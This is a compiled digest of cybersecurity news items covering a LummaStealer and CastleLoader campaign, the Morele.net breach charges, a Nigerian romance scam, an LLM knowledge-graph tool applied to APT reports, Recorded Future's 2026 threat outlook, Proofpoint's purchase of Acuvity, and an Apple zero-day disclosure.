“Recently, we have observed a considerable increase in LummaStealer activity in our insights. Loaders are typically delivered through evolving social-engineering lures, ranging from fake CAPTCHA challenges to bogus update notifications on Steam pages and game development websites.” reads the report published by Bitdefender. “The loaders themselves change frequently; we’ve seen LummaStealer using Rugmi, DonutLoader, and, more recently, CastleLoader for initial execution.”

CastleLoader is a script-based loader, often compiled with AutoIt, that decrypts and runs payloads directly in memory. Authors of the loader hide its logic with heavy obfuscation, renamed variables, and junk code. The loader checks for sandboxes and security tools, adjusts behavior to evade detection, and creates persistence by copying itself and the AutoIt interpreter, then adding a startup shortcut. A failed ping to a fake random domain leaves a detectable DNS trace. Finally, it uses layered XOR decryption and decompression to load and execute LummaStealer or another payload in memory.

Bitdefender reported that the campaigns rely on social engineering, not exploits. Victims download fake cracked software, game installers, movies, or adult content, often packaged as self-extracting archives or NSIS installers. When run, these files unpack and launch CastleLoader, which then delivers LummaStealer. Attackers abuse trusted platforms like Steam and Discord to boost credibility. ClickFix pages trick users into pasting malicious PowerShell commands. Some chains observed by the researchers add obfuscated VBA scripts and scheduled tasks for persistence.

LummaStealer is active worldwide, especially in India, the US, and Europe.

The distribution shifts based on customer targets because it steals credentials, browser sessions, financial info, crypto wallets, personal documents, and images, enabling account takeovers, fraud, identity theft, and blackmail.

Mitigations include avoiding untrusted downloads, never running manual commands, changing passwords, using multi-factor authentication, and monitoring for suspicious behavior and loader activity.

“LummaStealer remains a significant and evolving threat due to its combination of effective social engineering, flexible loader infrastructure, and a well-established MaaS ecosystem.” concludes the report. “The continued use of loaders such as CastleLoader, along with techniques like ClickFix, demonstrates a strategic shift toward delivery mechanisms that are difficult to disrupt through traditional technical defenses alone.”

[16] Graham Cluley - Polish hacker charged seven years after massive Morele.net data breach

[TAM METİN - 409 kelime]
A 29-year-old Polish man has been charged in connection with a data breach that exposed the personal details of around 2.5 million customers of the popular Polish e-commerce website Morele.net.

Poland's Central Cybercrime Bureau (CBZC) announced that charges were filed on 30 January 2026, following years of investigation into the 2018 breach of Morele.net, that specialises in electronics, computer equipment and home appliances.

The high-profile breach of Morele.net, whose international equivalents include the likes of Best Buy, Newegg, and Amazon, sent shockwaves through Poland's online retail sector.

The investigation into the data breach had originally been shelves after police failed to identify a suspect, but authorities claim that the trail never went entirely cold.

Over time investigators identified the attack vector, reconstructed the sequence of events, and traced digital breadcrumbs back to the alleged hacker - demonstrating their determination in a YouTube video.

According to a CBZC press release, the suspect has admitted responsibility for the hack.

The cyber attack exposed names, email addresses, phone numbers, home addresses, and md5crypt-hashed passwords. Although payment card details were not compromised in the breach, it was reported that some 35,000 customers did have particularly sensitive information stolen, including national ID numbers, financial details, education information, income, and marital status.

Morele.net refused to pay a ransom, and the breached database was published online.

Unfortunately for the site's users who had their information breached, fraudsters weaponised the stolen data immediately. Victims reported receiving SMS messages demanding payment of 1 Polish zloty to "complete" their orders, accompanied by phishing links that stole banking credentials.

In 2019, in what was one of the country's largest GDPR-related fines at the time, Poland's data protection authority regulator hit Morele.net to the tune of €645,000, claiming that had failed to detect and respond to unusual network traffic.

Morele.net contested the fine, arguing that its security measures were reasonable even if they ultimately proved insufficient against a determined attacker, and eventually Poland's Supreme Administrative Court annulled the penalty, saying it had finding deficiencies in the regulator's justification and calculation of the fine.

Now, however, it is the alleged hacker who will be hoping he can escape receiving a heavy punishment.

If anything, this case serves as a timely reminder to cybercriminals that they should not assume that they have evaded justice just because years have passed since their offence. Digital forensics techniques continue to improve, and law enforcement agencies are increasingly willing to pursue cold cases when new leads emerge.

AI bots are having existential crises, inventing religions, and allegedly plotting against humanity… or so the internet would have you believe.

We dig into Moltbook, the “AI-only” social network that sent Twitter into a meltdown, attracted breathless talk of the singularity, and turned out to be far less Terminator and far more humans role-playing as bots.

Plus we discuss why “vibe coding” your app might be a catastrophically bad idea, when security researchers can easily peek inside rifle through your private messages, API keys, and databases.

Also this week we learn that pro-Russian hackers are circling the Winter Olympics – or is it the Jamaican Bobsleigh team?

All this and more is discussed in episode 454 of the “Smashing Security” podcast with cybersecurity veteran Graham Cluley, and special guest Iain Thomson.

[18] Graham Cluley - Fake Dubai Crown Prince tracked to Nigerian mansion after $2.5M romance scam
────────────────────────────────────────────────────────────────────────────────
Tarih: Sat, 07 Feb 2026 13:19:52 +0000
Link: https://www.bitdefender.com/en-us/blog/hotforsecurity/fake-dubai-crown-prince-tracked-to-nigerian-mansion-after-2-5m-romance-scam

[TAM METİN - 653 kelime]
An investigation has tracked down a sophisticated scammer who posed as Dubai's Crown Prince in a succesful plot to defraud a Romanian businesswoman out of over US $2.5 million.

That in itself, sadly, is probably not that shocking a story. But what the Organised Crime and Corruption Reporting Project (OCCRP) discovered was that in this particular case the perpetrators presented themselves in the public eye as philanthropists, while secretly destroying victims' lives.

The victim, Laura (not her real name), was a successful Romanian businesswoman when she received a LinkedIn message three years ago from someone claiming to be the Crown Prince of Dubai.

The man said that he wanted her assistance in investing a large amount fo money in a humanitarian foundation in Romania. What followed was a textbook example of how modern romance scams can operate.

Over the next two years, the pair exchanged thousands of messages as a virtual romance developed. Meanwhile, Laura met a man who claimed to be the "Prince's financial manager" in London, where she was given login credentials to a bank account showing a deposit of over £200 million. The banking website was, of course, an elaborate fake.

Fortuitously, a friend of Laura's had helpfully photographed her meeting the "financial manager" - a snap that would later prove crucial.

Laura tried to withdraw funds from the account, only to receive demands for large fees to release "the Prince's funds." As Laura had already sent hundreds of thousands of dollars to her online beau, she kept on paying, believing that it was the only way to recover her money.

In total, she sent over US $2.5 million before realising that she had fallen victim to a con.

But things were not to go all the scammer's way. The fake prince had partners helping move the money, but they fell out over how the spoils of the scam should be divided. Ultimately they made contact with Laura, exposing the fraud and revealing the fake prince's real name: Nzube Henry Ikeji.

Laura was also sent videos of Ikeji at his newly-purchased mansion in Abuja, Nigeria.

Armed with this information, reporters from OCCRP travelled to Nigeria to track the scammer down.

Nigeria does not have extensive Google Street View coverage or complete property registries, and so OCCRP's Chikezie Omeje resorted to old-fashioned methods to locate Ikeji's mansion - spending days driving around Abuja until he found the matching mansion.

Meanwhile, the photograph taken by Laura's friend in London was shared with British police, who recognised the "financial manager" as Dr. Martins Abhulimhen, who they had coincidentally been investigating over suspicious bank transactions. These transactions, it transpired, were Laura's money, which police traced from Dr. Abhulimhen all the way to Nigeria and Ikeji himself.

But rather than hiding in the darkness like some shadowy criminal, Dr. Abhulimhen presented himself as a globe-trotting philanthropist and businessman, rubbing shoulders with powerful Nigerian officials and international figures. Until recently, for instance, he ran a foundation which campaigned against gender-based violence.

Bizarrely, Ikeji also runs a Nigerian humanitarian foundation, and according to British police some of Laura's stolen funds went directly to this charity.

A UK court has since returned to Laura over £113,000from Dr. Martins Abhulimhen's frozen bank accounts, but Laura has been told that any criminal investigation into her case would need to be led by Romanian authorities.

Laura's case may be extreme, but it's far from unique. Romance and investment scams have escalated worldwide, with organised crime syndicates recognising that online fraud can be a lucrative, easy, and comparatively safe way to make millions.

The FBI's Internet Crime Complaint Center consistently ranks romance scams amongst the costliest forms of cybercrime, whilst UK victims lost over £92 million to romance fraud in 2023 alone.

Whether Ikeji or Dr. Abhulimhen will face justice remains unclear. But at least one fake prince has discovered that his Nigerian mansion offers rather less sanctuary than he had hoped.

[19] SANS ISC - AI-Powered Knowledge Graph Generator &#x26; APTs, (Thu, Feb 12th)

AI-Powered Knowledge Graph Generator & APTs

Unstructured text to interactive knowledge graph via LLM & SPO triplet extraction

Courtesy of TLDR InfoSec Launches & Tools again, another fine discovery in Robert McDermott’s AI Powered Knowledge Graph Generator. Robert’s system takes unstructured text, uses your preferred LLM and extracts knowledge in the form of Subject-Predicate-Object (SPO) triplets, then visualizes the relationships as an interactive knowledge graph.[1]

Robert has documented AI Powered Knowledge Graph Generator (AIKG) beautifully, I’ll not be regurgitating it needlessly, so please read further for details regarding features, requirements, configuration, and options. I will detail a few installation insights that got me up and running quickly.
The feature summary is this:
AIKG automatically splits large documents into manageable chunks for processing and uses AI to identify entities and their relationships. As AIKG ensures consistent entity naming across document chunks, it discovers additional relationships between disconnected parts of the graph, then creates an interactive graph visualization. AIKG works with any OpenAI-compatible API endpoint; I used Ollama exclusively here with Google’s Gemma 3, a lightweight family of models built on Gemini technology. Gemma 3 is multimodal, processing text and images, and is the current, most capable model that runs on a single GPU. I ran my experimemts on a Lenovo ThinkBook 14 G4 circa 2022 with an AMD Ryzen 7 5825U 8-core processor, Radeon Graphics, and 40gb memory running Ubuntu 24.04.3 LTS.
My installation guidelines assume you have a full instance of Python3 and Ollama installed. My installation was implemented under my tools directory.

I opted to test AIKG via a couple of articles specific to Russian state-sponsored adversarial cyber campaigns as input:

CISA’s Cybersecurity Advisory Russian GRU Targeting Western Logistics Entities and Technology Companies May 2025

SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities January 2026

My use of these articles in particular was based on the assertion that APT and nation state activity is often well represented via interactive knowledge graph. I’ve advocated endlessly for visual link analysis and graph tech, including Maltego (the OG of knowledge graph tools) at far back as 2009, Graphviz in 2015, GraphFrames in 2018 and Beagle in 2019. As always, visualization, coupled with entity relationship mappings, are an imperative for security analysts, threat hunters, and any security professional seeking deeper and more meaningful insights. While the SecurityWeek piece is a bit light on content and density, it served well as a good initial experiment.
The CISA advisory is much more dense and served as an excellent, more extensive experiment.
I pulled them both into individual text files more easily ingested for processing with AIKG, shared for you here if you’d like to play along at home.

Starting with SecurityWeek’s Russia’s APT28 Targeting Energy Research, Defense Collaboration Entities, and the subsequent Russia-APT28-targeting.txt file I created for model ingestion, I ran Gemma 3 as a 12 billion parameter model as follows:

You may want or need to run Gemma 3 with fewer parameters depending on the performance and capabilities of your local system. Note that I am calling file paths rather explicitly to overcome complaints about missing config and input files.
The article makes reference to APT credential harvesting activity targeting people associated with a Turkish energy and nuclear research agency, as well as a spoofed OWA login portal containing Turkish-language text to target Turkish scientists and researchers. As part of it’s use of semantic triples (Subject-Predicate-Object (SPO) triplets), how does AIKG perform linking entities, attributes and values into machine readable statements [2] derived from the article content, as seen in Figure 1?

Figure 1: AIKG Gemma 3:12b result from SecurityWeek article

Quite well, I’d say. To manipulate the graph, you may opt to disable physics in the graph output toolbar so you can tweak node placements. As drawn from the statistics view for this graph, AIKG generated 38 nodes, 105 edges, 52 extracted edges, 53 inferred edges, and four communities. You can further filter as you see fit, but even unfiltered, and with just a little by of tuning at the presentation layer, we can immediately see success where semantic triples immediately emerge to excellent effect. We can see entity/relationship connections where, as an example, threat actor –> targeted –> people and people –> associated with –> think tanks, with direct reference to the aforementioned OWA portal and Turkish language. If you’re a cyberthreat intelligence analyst (CTI) or investigator, drawing visual conclusions derived from text processing will really help you step up your game in the form of context and enrichment in report writing. This same graph extends itself to represent the connection between the victims and the exploitation methods and infrastructure. If you don’t want to go through a full installation process for yourself to complete your own model execution, you should still grab the JSON and HTML output files and experiment with them in your browser. You’ll get a real sense of the power and impact of an interactive knowledge graph with the joint forces power of LLM and SPO triplets.
For a second experiment I selected related content in a longer, more in depth analysis courtesy of a CISA Cybersecurity Advisory (CISA friends, I’m pulling for you in tough times). If you are following along at home, be sure to exit ollama so you can rerun it with additional parameters (27b vs 12b); pass /bye as a message, and restart:

Given the density and length of this article, the graph as initially rendered is a bit untenable (no fault of AIKG) and requires some tuning and filtering for optimal effect. Graph Statistics for this experiment included 118 nodes, 486 edges, 152 extracted edges, 334 inferred edges, and seven communities. To filter, with a focus again on actions taken by Russian APT operatives, I chose as follows:

Select a Node by ID: threat actors

Select a network item: Nodes

Select a property: color

Select value(s): #e41a1c (red)

The result is more visually feasible, and allows ready tweaking to optimize network connections, as seen in Figure 2.

Figure 2: AIKG Gemma 3:27b result from CISA advisory

Shocking absolutely no one, we immediately encapsulate actor activity specific to credential access and influence operations via shell commands, Active Directory commands, and PowerShell commands. The conclusive connection is drawn however as threat actors –> targets –> defense industry. Ya think? ;-) In the advisory, see Description of Targets, including defense industry, as well as Initial Access TTPs, including credential guessing and brute force, and finally Post-Compromise TTPs and Exfiltration regarding various shell and AD commands. As a security professional reading this treatise, its reasonable to assume you’ve read a CISA Cybersecurity Advisory before. As such, its also reasonable to assume you’ll agree that knowledge graph generation from a highly dense, content rich collection of IOCs and behaviors is highly useful. I intend to work with my workplace ML team to further incorporate the principles explored herein as part of our context and enrichment generation practices. I suggest you consider the same if you have the opportunity. While SPO triplets, aka semantic triples, are most often associated with search engine optimization (SEO), their use, coupled with LLM power, really shines for threat intelligence applications.

Cheers…until next time.

2026 State of Security

Explore the intelligence from Recorded Future's Insikt Group annual threat landscape analysis: the definitive report on how geopolitical fragmentation, state-sponsored operations, and criminal ecosystem evolution are reshaping global risk.

Fragmentation is the new normal

The global threat landscape didn't simplify in 2025—it shattered. Geopolitical alliances strained. Criminal enterprises splintered and regrouped. State-sponsored actors shifted from dramatic disruptions to quiet pre-positioning. And as long-established norms unwound, convergence across once-distinct domains created unprecedented uncertainty.

The 2026 State of Security report delivers Insikt Group's most comprehensive annual analysis of the forces shaping global security—helping leaders reduce surprise, prioritize effectively, and act with confidence.

2025: A year of fragmentation

Geopolitical tensions dominate

Russia-Ukraine War Enters Fourth Year | Geopolitical

India-Pakistan Ballistic Missile Exchanges | Geopolitical

US-Brokered Ceasefire Prevents Escalation | Geopolitical

State-sponsored attacks

Israel-Iran Twelve-Day Conflict | Geopolitical

RedMike Campaign Targets Telecom Infrastructure | State-Sponsored

Chinese Actors Exploit Unpatched Cisco Devices Across 100+ Countries | State-Sponsored

Geopolitical threats and deepfakes

Thailand-Cambodia Border Clashes | Geopolitical

Russian GRU Operations Intensify Against NATO Infrastructure | State-Sponsored

Deepfake-Enabled Fraud Increases 10x Since 2024 | Emerging Technology

289 New Ransomware Variants Identified (33% YoY Increase) | Cybercrime

Synthetic Identity Fraud Up 300% | Emerging Technology

Law Enforcement Disruptions Fragment Criminal Ecosystems | Cybercrime

The converging threat landscape

Risk moves to the edges

China, Russia, Iran, and North Korea focused not on dramatic attacks but on covert accumulation of access—targeting identity systems, cloud environments, and edge infrastructure where oversight is weakest. The primary risk is no longer a single large-scale incident. It's sustained pre-positioning that enables persistent espionage and creates latent capacity for disruption.

Key Insight: Warning timelines are compressing. The adversaries are already inside.

Convergence across domains

Every major conflict in 2025 had a digital front—and the combatants weren't always who they claimed to be. Genuine intrusions, exaggerated claims, and disinformation reinforced one another across Israel-Iran, India-Pakistan, Thailand-Cambodia, and Russia-Ukraine conflicts.

Key Insight: Perception is now contested terrain. Even low-sophistication attacks generate outsized impact when amplified through coordinated information operations.

Fragmented, modular, resilient

Law enforcement achieved significant wins in 2025. But the criminal ecosystem adapted. Sustained pressure fractured large enterprises into smaller, decentralized operations. Groups adopted subscription models, outsourced operations, and relied on specialized services—creating a distributed criminal supply chain that's resilient and difficult to track.

Key Insight: Threat actors are adapting faster than defenses. Modular ecosystems mean even disrupted operations reconstitute rapidly.

Verification failure at scale

2025 was not a breakout year for AI-driven cyber operations. But the immediate risk isn't autonomous attacks—it's verification failure at scale, where deception becomes faster, cheaper, and more convincing. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

Key Insight: Organizations that act now to establish AI governance and prepare for post-quantum migration will hold significant advantages.

[23] Recorded Future - Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026
────────────────────────────────────────────────────────────────────────────────

Fragmentation Defined 2025's Threat Landscape. Here's What It Means for 2026

Uncertainty has become the operating environment for business. And this year, fragmentation is driving it.

The global threat landscape didn't simplify in 2025; it shattered. Geopolitical alliances strained. Criminal enterprises splintered under law enforcement pressure, then regrouped into smaller, faster, and harder-to-track operations. State-sponsored cyber actors shifted from dramatic disruptions to quiet pre-positioning, embedding themselves in networks and waiting. Hacktivist groups and influence networks amplified conflicts, blurring the line between genuine intrusions and perception warfare.

But here's what makes this moment dangerous: as long-established norms unwind, fragmentation is paradoxically enabling greater interoperability across domains that were once distinct. State objectives, criminal capability, and private-sector technology increasingly reinforce one another. That convergence creates uncertainty, compresses warning time, and expands plausible deniability.

Today, Recorded Future's Insikt Group releases the 2026 State of Security report, our most comprehensive annual analysis of the forces shaping global security.

Drawing on proprietary intelligence, network telemetry, and deep geopolitical analysis, this report examines how 2025's fractures are reshaping the threat environment — and what security leaders must prepare for in the year ahead.

The End of Stability as a Baseline Assumption

For decades, organizations built risk models around a core premise: that the international order would hold, diplomatic mechanisms would constrain escalation, and major powers would avoid direct confrontation.

That premise no longer applies.

In 2025, the international geopolitical order fragmented as hard-power competition, transactional diplomacy, and the testing of red lines became defining features of state behavior. The Russia–Ukraine war ground into its fourth year, with Moscow maintaining a strategic advantage despite minimal territorial gains. Israel and Iran clashed directly in a twelve-day conflict that reshaped regional power dynamics. India and Pakistan escalated to ballistic missile exchanges before a US-brokered ceasefire intervened. Thailand and Cambodia exchanged fire along disputed borders, triggering the most intense fighting in nearly fifteen years.

The pattern is clear: states are increasingly willing to use force to advance objectives when diplomatic mechanisms appear unreliable. As modern power struggles threaten institutions like international law, risk is spreading across domains that have historically had clearer boundaries.

For organizations, this means geopolitical crises are increasingly likely to spill over into corporate networks, supply chains, regulatory environments, and digital infrastructure with limited warning. Resilience, not stability, became the baseline operating assumption.

State-Sponsored Actors: Risk Moves to the Edges

While kinetic conflicts dominated headlines, some of 2025's most consequential state-sponsored activity unfolded quietly in digital environments — at the edges of networks where oversight is weakest.

China, Russia, Iran, and North Korea, also known as the four most capable and consistently active hostile state cyber actors Insikt Group tracks, focused not on dramatic attacks but on the covert accumulation of access. They targeted identity systems, cloud environments, and edge infrastructure: the poorly monitored network devices, VPN appliances, and perimeter systems that organizations struggle to patch and defend.

Insikt Group's reporting on RedMike highlighted disciplined pre-positioning in telecommunications infrastructure: access built selectively and held quietly for intelligence value by threat actors ready to pivot quickly when timing and pressure align. Chinese state-sponsored actors targeted telecommunications providers worldwide, with one campaign exploiting unpatched Cisco devices across more than 100 countries. Russian GRU-linked groups intensified operations against critical infrastructure in Ukraine and NATO member states. Iranian operators blended espionage with hack-and-leak campaigns. North Korean actors merged revenue generation with espionage, deploying fraudulent IT workers embedded in foreign companies as an access vector.

The strategic shift is profound: the primary risk is no longer a single, large-scale cyber incident. It's sustained pre-positioning that enables persistent espionage in peacetime and creates latent capacity for disruption during crises. Warning timelines are compressing, as the adversaries are already inside.

Hacktivists and Influence Operators: Convergence Across Domains

Every major conflict in 2025 had a digital front, and unsurprisingly, the combatants weren't always who they claimed to be.

Hacktivist groups, patriotic volunteers, and influence networks played growing roles in conflicts involving Israel–Iran, India–Pakistan, Thailand–Cambodia, and Russia–Ukraine. These actors operated with varying degrees of state alignment but consistently contributed to a threat landscape where genuine intrusions, exaggerated claims, and disinformation reinforced one another.

Regional escalation involving Israel and Iran showed how cyber operations, influence campaigns, and commercial surveillance tools can operate alongside military force, as domains converge in ways that would have seemed implausible just years ago. During the India–Pakistan escalation, both sides deployed large-scale influence networks that spread coordinated narratives, forged military documents, and amplified hacktivist claims of grid disruptions. Russian-aligned hacktivists targeted NATO countries with DDoS campaigns, with investigations revealing that portions of this "hacktivist" ecosystem function as state-directed fronts.

The implication for defenders: perception is now contested terrain. Even low-sophistication attacks can generate outsized reputational and psychological impact when amplified through coordinated information operations.

Cybercrime: Fragmented, Modular, Resilient

Law enforcement achieved significant wins against cybercriminal infrastructure in 2025. Forum takedowns, arrests, and sanctions disrupted major operations. Ransomware payments declined for the second consecutive year.

But the criminal ecosystem just adapted to these new conditions.

Sustained pressure fractured large criminal enterprises into smaller, more decentralized operations. Insikt Group identified 289 new ransomware variants this year (a 33% increase from 2024), most of which were derived from leaked source code. Groups adopted subscription models, outsourced operations, and relied on specialized services for laundering and negotiation. The result: a distributed criminal supply chain that's resilient, decentralized, and increasingly difficult to track.

Cybercrime groups increasingly aligned with national strategic objectives, blurring the boundaries between criminal and state activity. In Venezuela, state action eroded legal, political, and cyber boundaries, challenging assumptions about sovereignty and accountability. Mercenary spyware pursued the same persistent-access goals as state actors, embedding where oversight was weakest and adapting under pressure.

English-speaking criminal actors, such as the Scattered LAPSUS$ Hunters collective, demonstrated that low-tech social engineering tactics — particularly help desk impersonation — remain devastatingly effective. Meanwhile, organized crime in Southeast Asia industrialized fraud at an unprecedented scale, with Chinese-speaking transnational criminal organizations running call center compounds using coerced labor augmented by AI-driven automation.

For organizations, the takeaway is stark: threat actors are adapting faster than defenders. Modular criminal ecosystems that share tools, infrastructure, and access can reconstitute rapidly even after disruptions.

Emerging Technologies: Verification Failure at Scale

2025 was not a breakout year for AI-driven cyber operations.

To separate hype from signal, Insikt Group developed AIM3 — our framework for assessing AI malware maturity. It shows that most observed use remains at an early stage of development. Threat actors experimented with malicious AI models tailored for cyber operations, but the results were incremental rather than transformative.

The immediate risk is not autonomous attacks. It's verification failure at scale, where deception becomes faster, cheaper, and more convincing as AI is embedded into decision workflows.

Deepfake-enabled fraud has increased more than tenfold since the start of 2024. Synthetic identity fraud rose 300% in Q1 2025 alone. Adversaries began testing prompt injection attacks and "generated-SEO" manipulation to poison AI search results. As AI becomes empowered to take real-world actions through autonomous agents, the attack surface for fraud and manipulation will expand dramatically.

At the strategic level, the US–China race for AI dominance intensified, with China pursuing an aggressive diffusion strategy that's embedding Chinese LLMs into the global software ecosystem. Competition over quantum computing, advanced robotics, and space systems is extending beyond commercial markets into sustained geopolitical rivalry.

The organizations that act now to establish AI governance, inventory cryptographic dependencies, and prepare for post-quantum migration will hold significant advantages as these technologies mature.

What 2025 Teaches Us About 2026

Looking ahead, diplomatic friction, selective enforcement of norms, and accelerating technology adoption will continue to widen the gap between how risk is assumed to behave and how it actually behaves.

The patterns of 2025 point toward a 2026 threat environment defined by sustained uncertainty:

Simultaneous regional crises will become the norm. As enforcement of established norms becomes more selective, regional and emerging powers will pursue objectives more aggressively, and external intervention in internal conflicts will expand.

Connectivity disruptions will emerge as a primary tool of coercion. Undersea cables, satellite systems, and positioning/navigation/timing infrastructure are becoming strategic targets, with even limited interference capable of cascading across critical sectors.

Ransomware will fragment further. Declining payments will push threat actors toward shorter attack cycles, lower demands, and disruption-focused tactics designed to compel engagement.

The synthetic identity crisis will deepen. AI-enabled deepfakes and compromised identity verification systems will make business email compromise and social engineering more convincing and scalable.

AI will become the next great attack surface. Prompt-based manipulation will increasingly replace code-based exploits as the preferred intrusion method against AI systems.

Quantum readiness will move from planning to spending. Organizations will begin allocating dedicated budgets for cryptographic inventories, vendor transitions, and post-quantum migration pilots.

Robots and space systems will become contested cyber-physical terrain. In 2026, humanoid robots and space infrastructure will move from experimentation to operational deployment, increasing economic and strategic reliance on network-connected cyber-physical systems.

Intelligence does not eliminate uncertainty; having more access to more data points means nothing without context. Rather, intelligence makes the uncertainty more manageable.

Fragmentation creates complexity. But complexity rewards those who can see connections others miss, such as how risks across geopolitics, cyber operations, and criminal ecosystems converge to shape exposure. That's the purpose of the 2026 State of Security report: not just to catalog threats, but to help leaders reduce surprise, prioritize effectively, and act with confidence.

The full report includes detailed analysis of each threat domain, threat actor profiles, regional risk assessments, and actionable recommendations for building organizational resilience.

[24] Recorded Future - From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

From 27 Steps to 5: How Recorded Future Reimagined Threat Hunting with Autonomous Threat Operations

The manual operations gap can be a business risk

Manual threat hunting requires 27 steps that burn analyst time

Autonomous Threat Operations can reduce 27 steps to 5

Autonomous operations prove measurable ROI

At Recorded Future, we’re constantly looking for ways to help security teams work more efficiently so they can focus their expertise where it matters most: stopping threats before they impact business.

Over the past few years, as we spent time talking to our customers and observing the ways that their SOCs actually work day to day, we discovered a troubling pattern. Every Monday morning, analysts would begin a new round of threat hunts, manually gathering intelligence, writing queries for different tools, correlating findings, and documenting results. By Friday, they’d complete their reports. Meanwhile, attackers who may have breached the network on Tuesday may have already moved laterally, established persistence, and potentially exfiltrated data.

The manual operations gap

This inefficient approach to threat hunting wasn’t a people problem. It was a process problem.

We identified that traditional manual threat hunting required 27 separate steps, from selecting threat actors and gathering intelligence sources to validating anomalies and writing up reports for stakeholders.

Each of the 27 steps consumed hours of analyst time, and the entire manual workflow created what we now call the manual operations gap—the dangerous window between when threats emerge and when security teams can respond.

Rather than accept this gap as an inevitable reality, we asked ourselves a question: How many more threats could be prevented, and how could we improve organizations’ defenses overall, if we could make manual threat operations autonomous?

Rethinking manual workflows

Threat hunting represented the perfect use case for autonomous operations. It’s a critical security function that’s highly repetitive, spans multiple tools, requires constant updates as threats evolve, and must happen continuously—not just during business hours. We knew that if we could bring autonomous functionality to threat hunting, we could demonstrate a new model for security operations.

The breakthrough came from reimagining the entire workflow around a few core principles: intelligence-driven automation, seamless cross-tool orchestration, and continuous autonomous operations. Instead of analysts manually translating intelligence into queries for each security tool, what if their systems could automatically initiate hunts across SIEM, EDR, and other platforms simultaneously? Instead of analysts having to schedule weekly hunt cycles, what if threat hunting could run 24/7, adapting in real time as new intelligence emerged?

The result of this reimagining is Autonomous Threat Operations and the autonomous threat hunting capability, a new solution that reduces 27 manual steps to as few as 5 largely automated ones, delivering the speed, scale, and effectiveness that the modern threat landscape demands.

Closing the gap with autonomous operations

The transition from manual bottlenecks to autonomous operations isn't just about working faster—it's about working smarter. Security teams need workflows that scale their expertise rather than limit it, systems that integrate their existing investments rather than replace them, and processes that prove measurable ROI to justify continued investment.

Organizations that standardize on intelligence-led operations often demonstrate measurable gains in time to detect and time to respond. They can close the gap between threat emergence and defensive action, transforming security from a reactive cost center into a proactive risk-reduction function.

Want to see exactly how leading organizations are making this transformation? Our new playbook breaks down the specific steps for moving from manual threat hunting to autonomous operations—including the precise methodology for reducing complex, multi-day processes into streamlined workflows that run continuously.

Discover how to eliminate workflow bottlenecks, achieve 24/7 threat coverage, and prove the ROI of your security investments in the autonomous era.

[25] Cyberscoop - Proofpoint acquires Acuvity to tackle the security risks of agentic AI
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 583 kelime]
Proofpoint announced Thursday it has acquired Acuvity, an AI security startup, as the cybersecurity company moves to address security risks stemming from widespread corporate adoption of agentic AI.

The acquisition strengthens Proofpoint‘s capabilities in monitoring and securing AI-powered systems that are increasingly handling sensitive business functions across enterprises.

Financial terms of the deal were not disclosed, but Ryan Kalember, Proofpoint’s chief strategy officer, told CyberScoop that the acquisition was beyond a pure “technology acquisition,” with Acuvity’s engineering team slated to join the California-based company.

Acuvity specializes in visibility and governance for AI applications, including the ability to track how employees and automated systems interact with external AI services and protect custom AI models developed within organizations. The startup’s platform monitors AI usage across multiple deployments, from web browsers to specialized infrastructure including Model Context Protocol (MCP) servers and locally installed AI tools.

The deal reflects growing concern among enterprises about security gaps created as organizations deploy agentic AI across departments, like software development, customer support, finance, and legal operations. These systems increasingly access sensitive data and execute tasks previously handled exclusively by humans.

Additionally, AI-specific attack vectors such as prompt injection and model manipulation have emerged as potential threats that traditional cybersecurity tools were not designed to address.

Kalember said CISOs are seeing the potential risk combined with agentic AI growth, and are sensing the need to maintain governance without impeding innovation, particularly as the pace of AI adoption has outstripped many companies’ ability to secure these systems effectively.

“It has definitely been a pivot from, ‘I got to be able to stop prompt injection’ to ‘I have to be able to figure out what the AI is even doing,’” he told CyberScoop.

Last May, Proofpoint acquired Hornetsecurity Group, a Germany-based provider of Microsoft 365 security services, in a deal reportedly valued at more than $1 billion. Kalember told CyberScoop he sees Acuvity helping small- and medium-sized organizations that leverage Hornetsecurity’s offerings to boost its AI security.

“That is going to be a world in which, independent of the size of the organization, they are going to very much leverage AI, and some of that will be built into the tools like M365 that is tightly coupled with the Hornetsecurity architecture,” Kalember said.The acquisition follows a theme within the industry where larger security companies are buying AI-focused security startups. Just last week, data security firm Varonis acquired AI security firm AllTrue.ai for $150 million.

[26] Cyberscoop - Apple discloses first actively exploited zero-day of 2026
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 12 Feb 2026 23:48:20 +0000

[TAM METİN - 527 kelime]
Apple disclosed a zero-day vulnerability Wednesday that the vendor warned was previously “exploited in an extremely sophisticated attack against specific targeted individuals,” the company said in a security update.

The memory-corruption vulnerability — CVE-2026-20700 — affects iPhones and iPads and was exploited on devices running versions of iOS before iOS 26. The Cybersecurity and Infrastructure Security Agency added the defect to its known exploited vulnerabilities catalog Thursday.

The disclosure marks the first zero-day reported by Apple since late 2025, and the first Apple defect flagged as actively exploited by CISA this year.

“An attacker with memory write capability may be able to execute arbitrary code,” the company said.

Apple, which typically shares limited details about in-the-wild exploitation of zero-days, noted the latest zero-day, similar to others it disclosed last year, was exploited by sophisticated attackers targeting distinct people.

The company did not immediately respond to a request for comment and did not describe the nature or objectives of the attacks.

Caitlin Condon, vice president of security research at VulnCheck, said the zero-day was likely exploited as part of a highly targeted spyware or surveillance attack on a very small number of individuals’ devices.

The zero-day vulnerability, which was discovered by Google Threat Intelligence Group, affects dyld, Apple’s open-source dynamic link editor that acts as a core system component to securely load applications on users’ devices.

Apple said a pair of additional vulnerabilities affecting WebKit — CVE-2025-14174 and CVE-2025-43529 — were previously disclosed in response to attacks involving CVE-2026-20700.

The company did not describe how the three vulnerabilities are related, but previously noted CVE-2025-43529 was “exploited in an extremely sophisticated attack against specific targeted individuals.”

All three of the memory-corruption defects affect mobile operating systems, “where sophisticated zero-day attacks are commonly employed to surveil individuals, whether those are political dissidents, journalists, public figures or other high-value targets,” Condon said.

“Memory-corruption exploits are also commonly seen in sophisticated attacks, as they’re tricky to exploit reliably but provide elevated access,” she added.

Apple’s security updates for iOS 26.3 and iPadOS 26.3 addresses 38 vulnerabilities total, but CVE-2026-20700 is the only defect it disclosed as actively exploited prior to public disclosure.

A new report from Google found evidence that state-sponsored hacking groups have leveraged AI tool Gemini at nearly every stage of the cyber attack cycle.

